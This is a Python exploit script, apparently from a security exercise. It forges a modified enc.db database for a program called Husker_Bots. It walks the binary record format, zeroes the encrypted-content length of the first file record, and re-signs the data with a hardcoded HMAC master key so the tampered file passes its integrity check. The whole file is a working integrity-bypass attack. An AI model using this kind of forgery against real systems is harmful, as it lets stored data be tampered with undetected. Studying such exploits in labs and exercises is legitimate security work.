#!/usr/bin/env python3
"""
Forge a modified Husker_Bots enc.db: zero file1's enc_len, recompute HMAC.
Usage: python3 husker_forge.py <original_enc.db> <output_enc.db>

DB format (stor.c):
  [MAGIC 4B][num_users 4B][num_files 4B]
  USER_RECORD x num_users:
    [username_len 4B][username][key_hash 32B][key_salt 32B]
  FILE_RECORD x num_files:
    [filename_len 4B][filename][owner_len 4B][owner]
    [enc_len 4B][enc_content enc_len bytes][nonce 12B][content_salt 32B]
  [HMAC-SHA256 32B]

NONCE_LEN=12, HASH_LEN=32, SALT_LEN=32, TAG_LEN=16
"""
import sys
import hmac
import hashlib
import struct

MASTER_KEY = bytes([
    0x4b, 0x3a, 0x7f, 0x21, 0x9c, 0x55, 0xe8, 0x3d,
    0xb1, 0x06, 0x44, 0xfa, 0x2e, 0x91, 0x0c, 0x78,
    0xd5, 0x8b, 0x47, 0x3e, 0xa9, 0xcc, 0x1f, 0x60,
    0x77, 0x24, 0xbd, 0x50, 0x08, 0x3c, 0x92, 0x6a,
])
HASH_LEN  = 32
SALT_LEN  = 32
NONCE_LEN = 12


def recompute_hmac(data_without_mac: bytes) -> bytes:
    return hmac.new(MASTER_KEY, data_without_mac, hashlib.sha256).digest()


def parse_lenfield(data: bytes, offset: int):
    """Read uint32 length-prefixed field. Returns (bytes_value, new_offset)."""
    length = struct.unpack_from('<I', data, offset)[0]
    return data[offset + 4:offset + 4 + length], offset + 4 + length


def find_file1_enc_len_offset(data: bytes) -> int:
    """
    Walk the binary format to locate the enc_len field of the first file record.
    Returns the byte offset of the 4-byte little-endian uint32.
    """
    # header: MAGIC(4) + num_users(4) + num_files(4)
    num_users = struct.unpack_from('<I', data, 4)[0]
    num_files  = struct.unpack_from('<I', data, 8)[0]
    offset = 12

    # USER_RECORD: [username_len+username][key_hash 32B raw][key_salt 32B raw]
    for _ in range(num_users):
        _, offset = parse_lenfield(data, offset)  # username
        offset += HASH_LEN                         # key_hash (raw, not len-prefixed)
        offset += SALT_LEN                         # key_salt (raw, not len-prefixed)

    if num_files == 0:
        raise ValueError("no file records found in enc.db")

    # First FILE_RECORD: [filename][owner][enc_len 4B][enc_content][nonce 12B][salt 32B]
    _, offset = parse_lenfield(data, offset)  # filename
    _, offset = parse_lenfield(data, offset)  # owner
    # now at enc_len
    return offset


def forge(original_path: str, output_path: str) -> None:
    with open(original_path, 'rb') as f:
        raw = bytearray(f.read())

    body = raw[:-HASH_LEN]  # everything except the trailing HMAC

    enc_len_offset = find_file1_enc_len_offset(bytes(body))
    original_enc_len = struct.unpack_from('<I', body, enc_len_offset)[0]
    print(f"file1 enc_len at offset {enc_len_offset}: {original_enc_len} -> 0")

    # Zero enc_len so file1 appears empty
    struct.pack_into('<I', body, enc_len_offset, 0)

    new_mac = recompute_hmac(bytes(body))
    result  = bytes(body) + new_mac

    with open(output_path, 'wb') as f:
        f.write(result)
    print(f"written {len(result)} bytes to {output_path}")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <original.db> <output.db>")
        sys.exit(1)
    forge(sys.argv[1], sys.argv[2])
